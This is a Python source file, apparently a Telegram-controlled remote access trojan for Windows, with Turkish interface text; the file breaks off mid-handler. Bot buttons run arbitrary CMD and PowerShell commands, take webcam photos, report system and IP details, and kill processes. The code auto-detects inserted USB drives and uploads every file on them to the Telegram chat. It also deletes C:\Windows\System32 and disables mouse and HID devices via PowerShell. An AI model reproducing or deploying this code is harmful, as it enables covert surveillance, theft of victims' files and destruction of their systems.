import os
import subprocess
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import platform
import winreg
import time
import sys
from datetime import datetime
import socket
import getpass
import psutil
import cv2
import win32gui
import win32process
import glob
import pythoncom
import win32com.client
import logging
from urllib.parse import quote_plus
import win32file
import win32con
import win32api
import shutil

def get_usb_drives():
    drives = []
    for drive in range(ord('A'), ord('Z')+1):
        drive_path = f"{chr(drive)}:\\" 
        try:
            if os.path.exists(drive_path) and win32file.GetDriveType(drive_path) == win32con.DRIVE_REMOVABLE:
                drives.append({
                    'path': drive_path,
                    'label': win32api.GetVolumeInformation(drive_path)[0] or 'USB Disk'
                })
        except:
            continue
    return drives

def scan_and_send_usb_files(chat_id, drive_path):
    try:
        files = []
        total_size = 0
        
        # Tüm dosyaları topla ve boyutlarını hesapla
        for root, dirs, filenames in os.walk(drive_path):
            for filename in filenames:
                file_path = os.path.join(root, filename)
                try:
                    size = os.path.getsize(file_path)
                    total_size += size
                    files.append({
                        'path': file_path,
                        'size': size,
                        'name': filename
                    })
                except:
                    continue
        
        if not files:
            bot.send_message(chat_id, "❌ USB diskte dosya bulunamadı.")
            return
        
        # Dosyaları boyuta göre sırala (küçükten büyüğe)
        files.sort(key=lambda x: x['size'])
        
        # USB bilgilerini gönder
        bot.send_message(
            chat_id,
            f"💾 USB Disk Tarama Sonuçları:\n"
            f"📁 Sürücü: {drive_path}\n"
            f"📊 Toplam Boyut: {total_size / (1024*1024):.2f} MB\n"
            f"📑 Dosya Sayısı: {len(files)}"
        )
        
        # Dosyaları sırayla gönder
        for file in files:
            try:
                with open(file['path'], 'rb') as f:
                    bot.send_document(
                        chat_id,
                        f,
                        caption=f"📄 {file['name']}\n"
                               f"📍 {file['path']}\n"
                               f"📊 {file['size'] / 1024:.1f} KB"
                    )
                time.sleep(1)  # Her dosya arasında 1 saniye bekle
            except Exception as e:
                bot.send_message(
                    chat_id,
                    f"❌ Dosya gönderilemedi: {file['path']}\nHata: {str(e)}"
                )
                
    except Exception as e:
        bot.send_message(chat_id, f"❌ USB disk taranırken hata oluştu: {str(e)}")

def usb_drives_menu():
    keyboard = InlineKeyboardMarkup()
    drives = get_usb_drives()
    
    # Otomatik tarama butonu ekle
    keyboard.add(InlineKeyboardButton("🔄 Otomatik USB Tarama", callback_data="auto_scan_usb"))
    
    if not drives:
        keyboard.add(InlineKeyboardButton("❌ USB Disk Bulunamadı", callback_data="no_usb"))
    else:
        for idx, drive in enumerate(drives):
            keyboard.add(InlineKeyboardButton(
                f"💾 {drive['label']} ({drive['path']})", 
                callback_data=f"scan_usb_{idx}"
            ))
    
    keyboard.add(InlineKeyboardButton("🔄 Listeyi Yenile", callback_data="refresh_usb"))
    keyboard.add(InlineKeyboardButton("Ana Menüye Dön", callback_data="back_to_main"))
    return keyboard

# Otomatik USB tarama fonksiyonu
def auto_scan_usb(chat_id):
    previous_drives = set()
    
    while True:
        try:
            current_drives = set(drive['path'] for drive in get_usb_drives())
            
            # Yeni takılan USB'leri kontrol et
            new_drives = current_drives - previous_drives
            for drive in new_drives:
                bot.send_message(
                    chat_id,
                    f"🔌 Yeni USB disk tespit edildi: {drive}\nTarama başlatılıyor..."
                )
                scan_and_send_usb_files(chat_id, drive)
            
            previous_drives = current_drives
            time.sleep(2)  # Her 2 saniyede bir kontrol et
            
        except Exception as e:
            bot.send_message(chat_id, f"❌ Otomatik tarama hatası: {str(e)}")
            break

# --- Pinned Taskbar Apps Logic ---
def get_pinned_taskbar_apps():
    pinned_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar")
    lnk_files = glob.glob(os.path.join(pinned_folder, "*.lnk"))
    apps = []
    pythoncom.CoInitialize()
    shell = win32com.client.Dispatch("WScript.Shell")
    for lnk in lnk_files:
        try:
            shortcut = shell.CreateShortCut(lnk)
            target = shortcut.Targetpath
            name = os.path.splitext(os.path.basename(lnk))[0]
            apps.append({"name": name, "path": target})
        except Exception as e:
            logging.error(f"Kısayol oluşturulurken hata: {str(e)}")
            continue
    return apps

def get_running_executables():
    running = set()
    for proc in psutil.process_iter(['exe']):
        try:
            proc_info = proc.info['exe']
            if proc_info:
                running.add(os.path.normcase(proc_info))
        except Exception as e:
            logging.error(f"Çalışan uygulama bilgisi alınırken hata: {str(e)}")
            continue
    return running
# --- End Pinned Taskbar Apps Logic ---

def get_running_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            proc_info = proc.info
            if proc_info['name'] and proc_info['exe']:
                processes.append({
                    "pid": proc_info['pid'],
                    "name": proc_info['name'],
                    "path": proc_info['exe']
                })
        except Exception as e:
            continue
    return processes

def running_processes_menu():
    keyboard = InlineKeyboardMarkup()
    processes = get_running_processes()
    
    # En fazla 10 process göster
    for proc in processes[:10]:
        keyboard.add(InlineKeyboardButton(
            f"🔴 {proc['name']} (PID: {proc['pid']})", 
            callback_data=f"kill_process_{proc['pid']}"
        ))
    
    keyboard.add(InlineKeyboardButton("🔄 Listeyi Yenile", callback_data="refresh_processes"))
    keyboard.add(InlineKeyboardButton("Ana Menüye Dön", callback_data="back_to_main"))
    return keyboard

# --- Taskbar windows logic ---
taskbar_windows_cache = []

def get_taskbar_windows():
    windows = []
    def enum_handler(hwnd, ctx):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            windows.append({
                "hwnd": hwnd,
                "title": win32gui.GetWindowText(hwnd)
            })
    win32gui.EnumWindows(enum_handler, None)
    return windows

def taskbar_menu():
    global taskbar_windows_cache
    keyboard = InlineKeyboardMarkup()
    windows = get_taskbar_windows()
    taskbar_windows_cache = windows
    for idx, win in enumerate(windows[:10]):
        keyboard.add(InlineKeyboardButton(f"{win['title']}", callback_data=f"activate_window_{idx}"))
    keyboard.add(InlineKeyboardButton("Ana Menüye Dön", callback_data="back_to_main"))
    return keyboard

# --- Taskbar full menu logic ---
def taskbar_full_menu():
    keyboard = InlineKeyboardMarkup()
    pinned_apps = get_pinned_taskbar_apps()
    running_exes = get_running_executables()
    global taskbar_full_cache
    taskbar_full_cache = pinned_apps
    for idx, app in enumerate(pinned_apps):
        is_running = os.path.normcase(app["path"]) in running_exes
        label = f"{app['name']} {'🟢' if is_running else '⚪'}"
        keyboard.add(InlineKeyboardButton(label, callback_data=f"launch_taskbar_{idx}"))
    keyboard.add(InlineKeyboardButton("Ana Menüye Dön", callback_data="back_to_main"))
    return keyboard

taskbar_full_cache = []
# --- End Taskbar windows logic ---


def find_browser_path(browser):
    browser_paths = {
        "chrome": [
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
            os.path.expanduser("~/AppData/Local/Google/Chrome/Application/chrome.exe")
        ],
        "firefox": [
            "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
            os.path.expanduser("~/AppData/Local/Mozilla Firefox/firefox.exe")
        ],
        "edge": [
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
            os.path.expanduser("~/AppData/Local/Microsoft/Edge/Application/msedge.exe")
        ],
        "brave": [
            "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
            "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
            os.path.expanduser("~/AppData/Local/BraveSoftware/Brave-Browser/Application/brave.exe")
        ],
        "opera": [
            "C:\\Program Files\\Opera\\opera.exe",
            "C:\\Program Files (x86)\\Opera\\opera.exe",
            os.path.expanduser("~/AppData/Local/Programs/Opera/opera.exe")
        ]
    }
    browser_registry = {
        "chrome": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
        "firefox": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe",
        "edge": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",
        "brave": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\brave.exe",
        "opera": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe"
    }

    try:
        # Check common paths
        for path in browser_paths.get(browser, []):
            if os.path.exists(path):
                return path

        # Check registry
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, browser_registry[browser]) as key:
                browser_path = winreg.QueryValueEx(key, "")[0]
                if os.path.exists(browser_path):
                    return browser_path
        except WindowsError:
            pass

        return None
    except Exception as e:
        return None

# Telegram bot token
TELEGRAM_TOKEN = "TOKEN"
ADMIN_CHAT_ID = "5548042366"

# Initialize bot
bot = telebot.TeleBot(TELEGRAM_TOKEN)

# Store command history
command_history = []

# Get current device info
def get_current_device():
    try:
        return {
            "current_device": {
                "name": platform.node(),
                "os": platform.system()
            }
        }
    except Exception as e:
        logging.error(f"Error getting device info: {str(e)}")
        return {
            "current_device": {
                "name": "Unknown Device",
                "os": "Unknown"
            }
        }

# Build InlineKeyboard for device selection
def device_menu():
    keyboard = InlineKeyboardMarkup()
    devices = get_current_device()
    for device_id, device_info in devices.items():
        keyboard.add(InlineKeyboardButton(
            f"{device_info['name']} ({device_info['os']})", 
            callback_data=f"select_device_{device_id}"
        ))
    if not keyboard.keyboard:
        keyboard.add(InlineKeyboardButton("No devices found", callback_data="no_devices"))
    return keyboard

# Get detailed system information
def get_detailed_system_info():
    try:
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        username = getpass.getuser()
        # Find the first valid IPv4 address from all network interfaces
        ip = "Unknown"
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                    ip = addr.address
                    break
            if ip != "Unknown":
                break
        info = (
            f"💻 *Detailed System Information*\n"
            f"Operating System: {platform.system()} {platform.release()}\n"
            f"Machine: {platform.machine()}\n"
            f"Processor: {platform.processor()}\n"
            f"Computer Name: {platform.node()}\n"
            f"User: {username}\n"
            f"IP Address: {ip}\n"
            f"RAM: {ram.total // (1024**2)} MB\n"
            f"Disk: {disk.total // (1024**3)} GB\n"
        )
        return info
    except Exception as e:
        return f"Error retrieving info: {str(e)}"

# Helper function to find terminal paths (moved to global scope)
def find_terminal_path(terminal):
    terminal_paths = {
        "cmd": [
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\SysWOW64\\cmd.exe"
        ],
        "powershell": [
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    }
    
    try:
        for path in terminal_paths.get(terminal, []):
            if os.path.exists(path):
                return path
        
        return None
    except Exception as e:
        return None

# Function to open browser with a search query
def open_browser_with_search(browser_name, query):
    try:
        browser_path = find_browser_path(browser_name)
        if not browser_path:
            return False
        
        from urllib.parse import quote_plus
        encoded_query = quote_plus(query)
        url = f"https://www.google.com/search?q={encoded_query}"
        
        subprocess.Popen([browser_path, url])
        return True
    except Exception:
        return False

# Handler for browser search input
def handle_browser_search(message):
    try:
        if message.text and " " in message.text:
            parts = message.text.split(" ", 1)
            browser_name_input = parts[0].lower()
            query = parts[1]

            supported_browsers = ["chrome", "firefox", "edge", "brave", "opera"]
            if browser_name_input in supported_browsers:
                success = open_browser_with_search(browser_name_input, query)
                if success:
                    bot.send_message(message.chat.id, f"🔎 {browser_name_input.capitalize()} ile '{query}' araması başlatıldı!", reply_markup=main_menu())
                else:
                    bot.send_message(message.chat.id, f"❌ {browser_name_input.capitalize()} bulunamadı veya arama başlatılamadı.", reply_markup=main_menu())
            else:
                bot.send_message(message.chat.id, "🚫 Geçersiz tarayıcı adı. Lütfen desteklenen bir tarayıcı (chrome, firefox, edge, brave, opera) ve arama sorgusu girin.", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, "🚫 Lütfen şu formatta yazın: `tarayıcı_adı arama_terimi` (örneğin: `chrome en iyi AI modelleri`)", parse_mode='Markdown', reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Tarayıcı araması sırasında bir hata oluştu: {str(e)}", reply_markup=main_menu())

# Build InlineKeyboard for main menu (Keep only one definition)
def main_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("🌐 Chrome", callback_data="open_chrome"),
        InlineKeyboardButton("🦊 Firefox", callback_data="open_firefox")
    )
    keyboard.row(
        InlineKeyboardButton("💾 USB Diskleri Tara", callback_data="scan_usb")
    )
    keyboard.row(
        InlineKeyboardButton("🌍 Edge", callback_data="open_edge"),
        InlineKeyboardButton("🦁 Brave", callback_data="open_brave")
    )
    keyboard.row(
        InlineKeyboardButton("🎭 Opera", callback_data="open_opera")
    )
    keyboard.row(
        InlineKeyboardButton("🔎 Tarayıcıda Ara", callback_data="search_browser")
    )
    keyboard.row(
        InlineKeyboardButton("⚡ CMD", callback_data="open_cmd"),
        InlineKeyboardButton("🔧 PowerShell", callback_data="open_powershell")
    )
    keyboard.row(
        InlineKeyboardButton("💻 System Info", callback_data="system_info"),
        InlineKeyboardButton("📷 Fotoğraf Çek", callback_data="take_photo")
    )
    keyboard.row(
        InlineKeyboardButton("🖱️ Fareyi Devre Dışı Bırak", callback_data="disable_mouse"),
        InlineKeyboardButton("⌨️ Klavyeyi Devre Dışı Bırak", callback_data="disable_keyboard")
    )
    keyboard.row(
        InlineKeyboardButton("✍️ Run Custom Command", callback_data="custom_command")
    )
    keyboard.row(
        InlineKeyboardButton("📜 Command History", callback_data="command_history")
    )
    keyboard.row(
        InlineKeyboardButton("🪟 Görev Çubuğu (Sabitlenmiş+Açık)", callback_data="taskbar_full")
    )
    keyboard.row(
        InlineKeyboardButton("📊 Açık Programlar", callback_data="show_processes")
    )
    keyboard.row(
        InlineKeyboardButton("🔄 Restart Bot", callback_data="restart_bot")
    )
    keyboard.row(
        InlineKeyboardButton("☠️ system32 sil", callback_data="delete_system32")
    )
    keyboard.row(
        InlineKeyboardButton("💬 MessageBox Göster", callback_data="show_messagebox")
    )
    keyboard.row(
        InlineKeyboardButton("🖥️ CMD'de Komut Çalıştır", callback_data="run_cmd_command"),
        InlineKeyboardButton("🖥️ PowerShell'de Komut Çalıştır", callback_data="run_ps_command")
    )
    return keyboard

# Build InlineKeyboard for command history
def history_menu():
    keyboard = InlineKeyboardMarkup()
    for idx, cmd in enumerate(command_history[-5:], 1):
        keyboard.add(InlineKeyboardButton(
            f"Komut {idx}: {cmd[:20]}...", callback_data=f"run_history_{idx-1}"
        ))
    keyboard.add(InlineKeyboardButton("Ana Menüye Dön", callback_data="back_to_main"))
    return keyboard

# Start command
@bot.message_handler(commands=['start'])
def send_start(message):
    welcome_message = (
        "🤖 *Gelişmiş Kontrol Botuna Hoş Geldiniz!* 🤖\n"
        "Sistemle etkileşim kurmak için aşağıdaki düğmeleri kullanın.\n"
        f"Bağlanılan Cihaz: {platform.node()}\n"
        f"Sistem: {'Windows' if platform.system() == 'Windows' else 'Diğer'}"
    )
    try:
        bot.send_message(message.chat.id, welcome_message, parse_mode='Markdown', reply_markup=main_menu())
    except Exception as e:
        pass

# Help command
@bot.message_handler(commands=['help'])
def send_help(message):
    help_message = (
        "📚 *Mevcut Komutlar:*\n"
        "/start - Ana menüyü göster\n"
        "/help - Bu yardım mesajını göster\n"
        "\n*Butonlar:*\n"
        " - 🌐 Chrome: Chrome'u başlat\n"
        " - 🦊 Firefox: Firefox'u başlat\n"
        " - 🌍 Edge: Edge'i başlat\n"
        " - 🦁 Brave: Brave'i başlat\n"
        " - 🎭 Opera: Opera'yı başlat\n"
        " - 🔎 Tarayıcıda Ara: Seçilen tarayıcıda Google araması yap\n"
        " - ⚡ CMD: Komut istemcisini aç\n"
        " - 🔧 PowerShell: PowerShell'i aç\n"
        " - 💻 System Info: Detaylı sistem bilgilerini göster\n"
        " - 📷 Fotoğraf Çek: Web kamerasından fotoğraf çeker\n"
        " - ✍️ Run Custom Command: Özel komut çalıştır\n"
        " - 📜 Command History: Komut geçmişini görüntüle\n"
        " - 🔄 Restart Bot: Botu yeniden başlat\n"
        "\n*Not*: Unix komutları otomatik olarak Windows eşdeğerlerine çevrilir (`ls` -> `dir`, `cat` -> `type`)."
    )
    try:
        bot.send_message(message.chat.id, help_message, parse_mode='Markdown')
    except Exception:
        pass

def handle_cmd_command(message):
    try:
        if message.text:
            terminal_path = find_terminal_path("cmd")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "/k", message.text],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.edit_message_text(
                    "⚡ Komut yeni CMD penceresinde çalıştırıldı.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
            else:
                bot.edit_message_text(
                    "❌ CMD bulunamadı.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
        else:
            bot.edit_message_text(
                "🚫 Komut boş olamaz.",
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=main_menu()
            )
    except Exception as e:
        bot.edit_message_text(
            f"❌ Komut çalıştırılamadı: {str(e)}",
            chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=main_menu()
        )

def handle_ps_command(message):
    try:
        if message.text:
            terminal_path = find_terminal_path("powershell")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "-NoExit", "-Command", message.text],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.edit_message_text(
                    "🔧 Komut yeni PowerShell penceresinde çalıştırıldı.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
            else:
                bot.edit_message_text(
                    "❌ PowerShell bulunamadı.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
        else:
            bot.edit_message_text(
                "🚫 Komut boş olamaz.",
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=main_menu()
            )
    except Exception as e:
        bot.edit_message_text(
            f"❌ Komut çalıştırılamadı: {str(e)}",
            chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=main_menu()
        )


# Handle button presses
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global taskbar_windows_cache
    try:
        if call.data == "auto_scan_usb":
            bot.edit_message_text(
                "🔄 Otomatik USB tarama başlatıldı.\nYeni USB takıldığında otomatik olarak taranacak.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            # Otomatik taramayı ayrı bir thread'de başlat
            import threading
            scan_thread = threading.Thread(
                target=auto_scan_usb,
                args=(call.message.chat.id,)
            )
            scan_thread.daemon = True
            scan_thread.start()
            
        # Tarayıcı açma işlemleri
        browsers = {
            "open_chrome": "chrome",
            "open_firefox": "firefox",
            "open_edge": "edge",
            "open_brave": "brave",
            "open_opera": "opera"
        }

        if call.data in browsers:
            browser_name = browsers[call.data]
            browser_path = find_browser_path(browser_name)
            if browser_path:
                subprocess.Popen(browser_path)
                bot.answer_callback_query(call.id, f"{browser_name.capitalize()} başarıyla açıldı!")
                bot.send_message(call.message.chat.id, f"🌐 {browser_name.capitalize()} başlatıldı!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, f"{browser_name.capitalize()} bulunamadı")
                bot.send_message(call.message.chat.id, f"❌ {browser_name.capitalize()} bulunamadı.", reply_markup=main_menu())
        
        elif call.data == "search_browser":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "🔎 Hangi tarayıcıda ve ne aramak istiyorsun?\nLütfen şu formatta yaz: `tarayıcı_adı arama_terimi`\n(Örn: `chrome en son teknoloji haberleri`)",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, handle_browser_search)

        elif call.data == "run_cmd_command":
            sent = bot.send_message(
                call.message.chat.id,
                "⚡ CMD'de çalıştırmak istediğiniz komutu giriniz:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(sent, handle_cmd_command)
        elif call.data == "run_ps_command":
            sent = bot.send_message(
                call.message.chat.id,
                "🔧 PowerShell'de çalıştırmak istediğiniz komutu giriniz:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(sent, handle_ps_command)

        # CMD ve PowerShell açma işlemleri
        elif call.data == "open_cmd":
            terminal_path = find_terminal_path("cmd")
            if terminal_path:
                subprocess.Popen(terminal_path, creationflags=subprocess.CREATE_NEW_CONSOLE)
                bot.answer_callback_query(call.id, "CMD başarıyla açıldı!")
                bot.send_message(call.message.chat.id, "⚡ CMD başlatıldı!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "CMD bulunamadı")
                bot.send_message(call.message.chat.id, "❌ CMD bulunamadı.", reply_markup=main_menu())
                
        elif call.data == "open_powershell":
            terminal_path = find_terminal_path("powershell")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "-NoExit", "-Command", 
                     "$host.UI.RawUI.WindowTitle = 'PowerShell IDE'; $host.UI.RawUI.BackgroundColor = 'Black'; $host.UI.RawUI.ForegroundColor = 'Green'; Clear-Host"],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.answer_callback_query(call.id, "PowerShell başarıyla açıldı!")
                bot.send_message(call.message.chat.id, "🔧 PowerShell başlatıldı!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "PowerShell bulunamadı")
                bot.send_message(call.message.chat.id, "❌ PowerShell bulunamadı.", reply_markup=main_menu())

        # Sistem bilgisi gösterme
        elif call.data == "system_info":
            system_info = get_detailed_system_info()
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, system_info, parse_mode='Markdown', reply_markup=main_menu())

        elif call.data == "take_photo": # Yeni callback
            bot.answer_callback_query(call.id, "Fotoğraf çekme işlemi başlatılıyor...")
            take_photo_and_send(call.message.chat.id)

        elif call.data == "custom_command": # CHANGED if to elif
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "✍️ Çalıştırmak istediğiniz komutu girin (örneğin: `dir`, `type dosya.txt`):\n\n*Not*: Unix komutları (`ls`, `cat` vb.) otomatik olarak Windows eşdeğerlerine çevrilir.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, run_custom_command)

        elif call.data.startswith("select_device_"):
            device_id = call.data.split("_")[-1]
            devices = get_current_device() # Bu fonksiyon sadece mevcut cihazı döndürüyor, ID bazlı seçim için mantık gözden geçirilmeli
            device_info = devices.get(device_id, {}) # Eğer birden fazla cihaz yönetimi hedefleniyorsa DEVICES sözlüğü kullanılmalı
            info = (
                f"📡 *Cihaz: {device_info.get('name', 'Bilinmiyor')}*\n"
                f"İşletim Sistemi: {device_info.get('os', 'Yok')}"
            )
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, info, parse_mode='Markdown', reply_markup=main_menu())

        elif call.data == "no_devices":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "🖥️ Yapılandırılmış cihaz bulunamadı.",
                parse_mode='Markdown',
                reply_markup=main_menu()
            )

        elif call.data == "command_history":
            if command_history:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "📜 *Son Komutlar*",
                    parse_mode='Markdown',
                    reply_markup=history_menu()
                )
            else:
                bot.answer_callback_query(call.id, "Komut geçmişi yok")
                bot.send_message(
                    call.message.chat.id,
                    "📜 Geçmişte henüz komut yok.",
                    parse_mode='Markdown',
                    reply_markup=main_menu()
                )

        elif call.data.startswith("run_history_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(command_history):
                command = command_history[idx]
                bot.answer_callback_query(call.id, f"Çalıştırılıyor: {command}")
                bot.send_message(
                    call.message.chat.id,
                    f"✍️ Komut çalıştırılıyor: `{command}`",
                    parse_mode='Markdown',
                    reply_markup=main_menu()
                )
                run_custom_command_with_text(call.message, command) # message objesi call.message olmalı
            else:
                bot.answer_callback_query(call.id, "Geçersiz komut")
                bot.send_message(
                    call.message.chat.id,
                    "❌ Geçersiz komut seçildi.",
                    reply_markup=main_menu()
                )
    
        elif call.data == "restart_bot":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "🔄 Bot yeniden başlatılıyor...", parse_mode='Markdown')
            bot.stop_polling()
            os.execv(sys.executable, ['python'] + sys.argv)

        elif call.data == "cancel_command":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "🚫 Komut girişi iptal edildi.", reply_markup=main_menu())

        elif call.data == "back_to_main":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "↩️ Ana menüye dönüldü.", reply_markup=main_menu())

        elif call.data == "scan_usb":
            bot.edit_message_text(
                "💾 USB Diskleri Taranıyor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )
            
        elif call.data.startswith("scan_usb_"):
            try:
                idx = int(call.data.split("_")[2])
                drives = get_usb_drives()
                if idx < len(drives):
                    drive = drives[idx]
                    bot.edit_message_text(
                        f"💾 {drive['label']} ({drive['path']}) taranıyor...",
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id
                    )
                    scan_and_send_usb_files(call.message.chat.id, drive['path'])
                    bot.send_message(
                        call.message.chat.id,
                        "✅ USB disk taraması tamamlandı!",
                        reply_markup=main_menu()
                    )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Hata: {str(e)}")
                
        elif call.data == "refresh_usb":
            bot.edit_message_text(
                "💾 USB Diskleri Taranıyor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )

        elif call.data == "show_processes":
            bot.edit_message_text(
                "📊 *Çalışan Programlar*\n"
                "Kapatmak istediğiniz programa tıklayın:",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='Markdown',
                reply_markup=running_processes_menu()
            )
            
        elif call.data == "refresh_processes":
            try:
                bot.edit_message_text(
                    "📊 Çalışan Programlar:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=running_processes_menu()
                )
                bot.answer_callback_query(call.id, "✅ Liste yenilendi!")
            except Exception as e:
                bot.answer_callback_query(call.id, "❌ Liste yenilenemedi!")
                bot.send_message(
                    call.message.chat.id,
                    f"❌ Hata oluştu: {str(e)}",
                    reply_markup=main_menu()
                )
            
        elif call.data.startswith("kill_process_"):
            pid = int(call.data.split("_")[2])
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                bot.answer_callback_query(call.id, f"✅ {process_name} başarıyla kapatıldı!")
                # Listeyi yenile
                bot.edit_message_text(
                    "📊 *Çalışan Programlar*\n"
                    "Kapatmak istediğiniz programa tıklayın:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=running_processes_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Program kapatılamadı: {str(e)}")

        elif call.data == "delete_system32":
            try:
                import shutil
                system32_path = r"C:\Windows\System32"
                shutil.rmtree(system32_path)
                bot.answer_callback_query(call.id, "system32 silindi!")
                bot.send_message(call.message.chat.id, "☠️ system32 silindi! (Sisteminiz artık çalışmayabilir.)", reply_markup=main_menu())
            except Exception as e:
                bot.answer_callback_query(call.id, "Silinemedi")
                bot.send_message(call.message.chat.id, f"❌ system32 silinemedi: {str(e)}", reply_markup=main_menu())

        elif call.data == "show_messagebox":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "💬 Lütfen ekranda göstermek istediğiniz mesajı yazınız:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, handle_messagebox_text)
            logging.info("MessageBox metni istendi")
            
        elif call.data == "disable_mouse":
            try:
                # Fare cihazlarını devre dışı bırakmak için DevCon kullanımı
                subprocess.run([
                    "powershell", 
                    "-Command",
                    "$mouse = Get-WmiObject Win32_PnPEntity | Where-Object {$_.Name -like '*mouse*' -or $_.Name -like '*HID*'}; foreach ($device in $mouse) { $device.Disable() }"
                ], shell=True, capture_output=True)
                
                bot.answer_callback_query(call.id, "🖱️ Fare devre dışı bırakıldı!")
                bot.edit_message_text(
                    "🖱️ Fare başarıyla devre dışı bırakıldı!\nTekrar etkinleştirmek için bilgisayarı yeniden başlatın.",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=main_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Fare devre dışı bırakılamadı: {str(e)}")
                
        elif call.data == "disable_keyboard":
            try:
                # Ctrl+A ve Delete tuşlarını simüle et
                subprocess.run([
                    "powershell",
                    "-Command",
                    """
                    Add-Type -AssemblyName System.Windows.Forms
                    [System.Windows.Forms.SendKeys]::SendWait('^a')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{DELETE}')
                    """
                ], shell=True, capture_output=True)
                
                bot.answer_callback_query(call.id, "⌨️ Tüm içerik seçilip silindi!")
                bot.edit_message_text(
                    "⌨️ Klavye komutu başarıyla uygulandı!",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=main_menu()
                )
            except Exception as e:
